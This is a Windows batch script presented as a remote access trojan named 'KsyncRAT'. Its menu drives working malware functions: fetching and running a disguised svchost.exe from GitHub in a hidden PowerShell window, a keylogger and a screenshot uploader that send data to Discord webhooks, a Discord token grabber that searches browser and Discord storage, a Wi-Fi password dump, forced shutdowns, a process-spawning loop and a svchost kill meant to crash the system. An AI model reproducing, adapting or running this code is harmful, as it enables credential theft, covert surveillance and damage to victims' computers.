@echo off
chcp 65001 >nul
title KsyncRAT - by : hostaa
call :banner
:prompt
echo.
set /p cmd="KsyncRat > "
if "%cmd%" EQU "help" goto help
if "%cmd%" EQU "1" goto dcrat
if "%cmd%" EQU "2" goto ss
if "%cmd%" EQU "3" goto wifipass
if "%cmd%" EQU "4" goto PcManage
if "%cmd%" EQU "5" goto MsgBox
if "%cmd%" EQU "6" goto TokenGrab
if "%cmd%" EQU "7" goto Troll
if "%cmd%" EQU "8" goto shell
if "%cmd%" EQU "9" goto locate
if "%cmd%" EQU "10" goto pcinfo
if "%cmd%" EQU "11" goto keylogger
if "%cmd%" EQU "12" goto builder
:help
echo 1) inject Discord RAT (WILL EXIT KsyncRAT)
echo 2) Screenshot
echo 3) Steal wifi passwords
echo 4) Pc Managment
echo 5) MsgBox
echo 6) Token Grabber
echo 7) Troll
echo 8) Remote shell
echo 9) Geolocate
echo 10) PcInfo
echo 11) Keylogger
echo 12) rat builder
goto :prompt
:builder
set /p path="path to folder: "
curl -s https://raw.githubusercontent.com/randomguyontiktoklivenumber2-crypto/KsyncRAT/refs/heads/main/main.bat --output %path%\KsyncRAT.bat
goto prompt
:shell
echo remote shell type "exit" to go back to the RAT
cmd.exe
goto prompt
:keylogger
echo ! WARNING ! VICTIM WILL NEED PYTHON INSTALLED ! WARNING !
pip install requests >nul 2>&1
pip install pynput >nul 2>&1
timeout /t 10 >nul 
cd %temp%
set /p keyloggerwebhook="webhook > "
echo import requests>>keylogger.py 
echo from pynput.keyboard import Key, Listener>>keylogger.py 
echo >>keylogger.py 
echo webhook_url = "%keyloggerwebhook%">>keylogger.py 
echo >>keylogger.py 
echo def on_press(key):>>keylogger.py 
echo     try:>>keylogger.py 
echo         # Format the keystroke data>>keylogger.py 
echo         keystroke = f"**{key.char}** pressed">>keylogger.py 
echo     except AttributeError:>>keylogger.py 
echo        keystroke = f"**{key}** pressed">>keylogger.py 
echo >>keylogger.py 
echo     # Send data to Discord webhook>>keylogger.py 
echo     data = {>>keylogger.py 
echo         "content": keystroke>>keylogger.py 
echo     }>>keylogger.py 
echo     response = requests.post(webhook_url, json=data)>>keylogger.py 
echo >>keylogger.py 
echo     if response.status_code != 204:>>keylogger.py 
echo         print(f"Failed to send keystroke: {response.status_code}")>>keylogger.py 
echo 
echo def main():>>keylogger.py 
echo     with Listener(on_press=on_press) as listener:>>keylogger.py 
echo         listener.join()>>keylogger.py 
echo >>keylogger.py 
echo if __name__ == "__main__":>>keylogger.py 
echo    main()>>keylogger.py 
:locate
setlocal enabledelayedexpansion
curl -s ifconfig.me/ip>>%appdata%\Debug.txt
set /p ip=<%appdata%\Debug.txt
curl -s http://ipinfo.io/%ip%/json>>%appdata%\Publish.txt

for /f "tokens=* delims= " %%X in (%appdata%\Publish.txt) DO (
    set line=%%X
    set line=!line:"=!
    echo  !line!>>%appdata%\Release.txt
)
endlocal

echo.
echo   Geolocation
echo  -------------
type %appdata%\Release.txt | findstr /v "{" | findstr /v "}" | findstr /v "readme"
echo.
del %appdata%\Release.txt
del %appdata%\Publish.txt
del %appdata%\Debug.txt
goto prompt
:dcrat
cd %temp% && powershell -WindowStyle Hidden -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/randomguyontiktoklivenumber2-crypto/dcrat/main/svchost.exe' -OutFile 'program.exe'" && timeout /t 4 >nul && program.exe && del program.exe
goto :prompt
:pcinfo
ping localhost -n 1 >nul
if not exist %appdata%\Debug.txt goto infowait
set /p publicip=<%appdata%\Debug.txt
del %appdata%\Debug.txt
FOR /F "tokens=2 delims=:" %%a in ('systeminfo ^| find "Registered Owner"') do set owner=%%~a
FOR /F "tokens=2 delims=:" %%a in ('systeminfo ^| find "OS Name"') do set osname=%%~a
FOR /F "tokens=2 delims=:" %%a in ('systeminfo ^| find "System Manufacturer"') do set manufacture=%%~a
set owner=%owner: =%
set osname=%osname:~19%
set manufacture=%manufacture:~7%
echo.
echo Username: %username%
echo Hostname: %computername%
echo OS: %osname%
echo Owner: %owner%
echo Local IP: %localip%
echo Public IP: %publicip%
echo Manufacturer: %manufacture%
echo.
goto prompt
:ss
echo.
set /p webhook="webhook"
cd %temp%
setlocal

set "webhook=%webhook%"
set "ps1=%TEMP%\shot.ps1"
set "shot=%TEMP%\screenshot.png"

:: Write the PowerShell script
> "%ps1%" echo Add-Type -AssemblyName System.Windows.Forms
>>"%ps1%" echo Add-Type -AssemblyName System.Drawing
>>"%ps1%" echo $path = "%shot%"
>>"%ps1%" echo $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
>>"%ps1%" echo $bmp = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
>>"%ps1%" echo $gfx = [System.Drawing.Graphics]::FromImage($bmp)
>>"%ps1%" echo $gfx.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bmp.Size)
>>"%ps1%" echo $bmp.Save($path, [System.Drawing.Imaging.ImageFormat]::Png)
>>"%ps1%" echo $gfx.Dispose^()
>>"%ps1%" echo $bmp.Dispose^()

:: Multipart upload (PowerShell 5.1 compatible)
>>"%ps1%" echo $boundary = [System.Guid]::NewGuid().ToString()
>>"%ps1%" echo $fileBytes = [System.IO.File]::ReadAllBytes("%shot%")
>>"%ps1%" echo $fileHeader = "--$boundary`r`nContent-Disposition: form-data; name=`"file`"; filename=`"screenshot.png`"`r`nContent-Type: image/png`r`n`r`n"
>>"%ps1%" echo $footer = "`r`n--$boundary--`r`n"
>>"%ps1%" echo $bodyBytes = [System.Text.Encoding]::ASCII.GetBytes($fileHeader) + $fileBytes + [System.Text.Encoding]::ASCII.GetBytes($footer)

>>"%ps1%" echo $req = [System.Net.HttpWebRequest]::Create("%webhook%")
>>"%ps1%" echo $req.Method = "POST"
>>"%ps1%" echo $req.ContentType = "multipart/form-data; boundary=$boundary"
>>"%ps1%" echo $req.ContentLength = $bodyBytes.Length
>>"%ps1%" echo $stream = $req.GetRequestStream()
>>"%ps1%" echo $stream.Write($bodyBytes, 0, $bodyBytes.Length)
>>"%ps1%" echo $stream.Close()
>>"%ps1%" echo $resp = $req.GetResponse()
>>"%ps1%" echo $resp.Close()

:: Run the PowerShell script
powershell -NoLogo -NoProfile -ExecutionPolicy Bypass -File "%ps1%"
echo done.
goto :prompt
:wifipass
setlocal enabledelayedexpansion

for /F "tokens=2 delims=:" %%a in ('netsh wlan show profile') do (
    set wifi_pwd=
    for /F "tokens=2 delims=: usebackq" %%F IN (`netsh wlan show profile %%a key^=clear ^| find "Key Content"`) do (
        set wifi_pwd=%%F
    )
    echo %%a : !wifi_pwd!
     
	
)
goto :prompt
:PcManage
echo would you like to shutdown(s),  restart(r) or logoff(l)
set /p choice="choice > "
if "%choice%" EQU "s" shutdown /s /t 00
if "%choice%" EQU "r" shutdown /r /t 00
if "%choice%" EQU "l" shutdown /l
goto prompt 
:MsgBox
set /p msgtitle=Title: 
set /p msgmsg=Message: 
set /p msgicon=Icon (Information, Error, Warning): 
chcp 437 >nul
powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('%msgmsg%', '%msgtitle%', 'OK', [System.Windows.Forms.MessageBoxIcon]::%msgicon%);}"
chcp 65001 >nul
:TokenGrab
cd %appdata%
if exist Update.ps1 del /s /q Update.ps1 >nul
set /p webhook=Webhook URL: 
echo $hook  = "%webhook%">>Update.ps1
echo $token = new-object System.Collections.Specialized.StringCollection>>Update.ps1
echo Stop-Process -Name "Discord" -Force>>Update.ps1
echo. >>Update.ps1
echo $db_path = @(>>Update.ps1
echo     $env:APPDATA + "\Discord\Local Storage\leveldb">>Update.ps1
echo     $env:APPDATA + "\Roaming\Discord\Local Storage\leveldb">>Update.ps1
echo     $env:APPDATA + "\Roaming\Lightcord\Local Storage\leveldb">>Update.ps1
echo     $env:APPDATA + "\Roaming\discordptb\Local Storage\leveldb">>Update.ps1
echo     $env:APPDATA + "\Roaming\discordcanary\Local Storage\leveldb">>Update.ps1
echo     $env:APPDATA + "\Roaming\Opera Software\Opera Stable\Local Storage\leveldb">>Update.ps1
echo     $env:APPDATA + "\Roaming\Opera Software\Opera GX Stable\Local Storage\leveldb">>Update.ps1
echo. >>Update.ps1
echo     $env:APPDATA + "\Local\Amigo\User Data\Local Storage\leveldb">>Update.ps1
echo     $env:APPDATA + "\Local\Torch\User Data\Local Storage\leveldb">>Update.ps1
echo     $env:APPDATA + "\Local\Kometa\User Data\Local Storage\leveldb">>Update.ps1
echo     $env:APPDATA + "\Local\Orbitum\User Data\Local Storage\leveldb">>Update.ps1
echo     $env:APPDATA + "\Local\CentBrowser\User Data\Local Storage\leveldb">>Update.ps1
echo     $env:APPDATA + "\Local\7Star\7Star\User Data\Local Storage\leveldb">>Update.ps1
echo     $env:APPDATA + "\Local\Sputnik\Sputnik\User Data\Local Storage\leveldb">>Update.ps1
echo     $env:APPDATA + "\Local\Vivaldi\User Data\Default\Local Storage\leveldb">>Update.ps1
echo     $env:APPDATA + "\Local\Google\Chrome SxS\User Data\Local Storage\leveldb">>Update.ps1
echo     $env:APPDATA + "\Local\Epic Privacy Browser\User Data\Local Storage\leveldb">>Update.ps1
echo     $env:APPDATA + "\Local\Google\Chrome\User Data\Default\Local Storage\leveldb">>Update.ps1
echo     $env:APPDATA + "\Local\uCozMedia\Uran\User Data\Default\Local Storage\leveldb">>Update.ps1
echo     $env:APPDATA + "\Local\Microsoft\Edge\User Data\Default\Local Storage\leveldb">>Update.ps1
echo     $env:APPDATA + "\Local\Yandex\YandexBrowser\User Data\Default\Local Storage\leveldb">>Update.ps1
echo     $env:APPDATA + "\Local\Opera Software\Opera Neon\User Data\Default\Local Storage\leveldb">>Update.ps1
echo     $env:APPDATA + "\Local\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb">>Update.ps1
echo )>>Update.ps1
echo. >>Update.ps1
echo foreach ($path in $db_path) {>>Update.ps1
echo     if (Test-Path $path) {>>Update.ps1
echo         foreach ($file in Get-ChildItem -Path $path -Name) {>>Update.ps1
echo             $data = Get-Content -Path "$($path)\$($file)">>Update.ps1
echo             $regex = [regex] "[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}">>Update.ps1
echo             $match = $regex.Match($data)>>Update.ps1
echo. >>Update.ps1
echo            while ($match.Success) {>>Update.ps1
echo                 if (!$token.Contains($match.Value)) {>>Update.ps1
echo                     $token.Add($match.Value) ^| out-null>>Update.ps1
echo                 }>>Update.ps1
echo. >>Update.ps1
echo                $match = $match.NextMatch()>>Update.ps1
echo             }>>Update.ps1
echo         }>>Update.ps1
echo     }>>Update.ps1
echo }>>Update.ps1
echo >>Update.ps1
echo $content = "**Client: %localip%**``` ">>Update.ps1
echo foreach ($data in $token) {>>Update.ps1
echo     $content = [string]::Concat($content, "`n", $data)>>Update.ps1
echo }>>Update.ps1
echo $content = [string]::Concat($content, "``` ")>>Update.ps1
echo >>Update.ps1
echo $JSON = @{ "content"= $content; "username"= "KsyncRAT"; "avatar_url"= "https://wallpapercave.com/wp/wp8715191.jpg" }  ^| convertto-json>>Update.ps1
echo Invoke-WebRequest -uri $hook -Method POST -Body $JSON -Headers @{"Content-Type" = "application/json"}>>Update.ps1
cd %homepath%
chcp 437 >nul
powershell.exe -executionpolicy unrestricted "%appdata%\Update.ps1" >nul 2>&1 && del %appdata%\Update.ps1
chcp 65001 >nul
goto prompt
:Troll
echo ___________________
echo 
echo       TROLL
echo ___________________
echo.
echo 1) loopstart programs
echo 2) voice something
echo 3) BlueScreen (NEEDS ADMIN)
echo 4) logoff
echo 5) back to menu
set /p troll="KTroll > " 
if "%troll%" EQU "1" goto loopstart
if "%troll%" EQU "2" goto voice
if "%troll%" EQU "3" goto BlueScreen
if "%troll%" EQU "4" goto signout
if "%troll%" EQU "5" goto prompt
:loopstart
start calc
start cmd 
start notepad
goto loopstart
:voice
echo.
set /p say="say? > "
cd %temp%
echo Add-Type -AssemblyName System.Speech

echo $speaker = New-Object System.Speech.Synthesis.SpeechSynthesizer
echo $speaker.Speak("%say%")
goto Troll
:BlueScreen
net session >nul 2>&1
if %errorlevel% EQU 0 goto admin
echo error: no admin
goto troll
:admin
taskkill /im svchost.exe /f
echo BlueScreen Successful
pause
exit
:signout
shutdown /l
echo Signout Successful
pause
:banner
echo.
echo.
echo                                       ██╗  ██╗███████╗██╗   ██╗███╗   ██╗ ██████╗██████╗  █████╗ ████████╗
echo                                       ██║ ██╔╝██╔════╝╚██╗ ██╔╝████╗  ██║██╔════╝██╔══██╗██╔══██╗╚══██╔══╝
echo                                       █████╔╝ ███████╗ ╚████╔╝ ██╔██╗ ██║██║     ██████╔╝███████║   ██║   
echo                                       ██╔═██╗ ╚════██║  ╚██╔╝  ██║╚██╗██║██║     ██╔══██╗██╔══██║   ██║   
echo                                       ██║  ██╗███████║   ██║   ██║ ╚████║╚██████╗██║  ██║██║  ██║   ██║   
echo                                       ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═══╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
echo.    
echo.                                                                
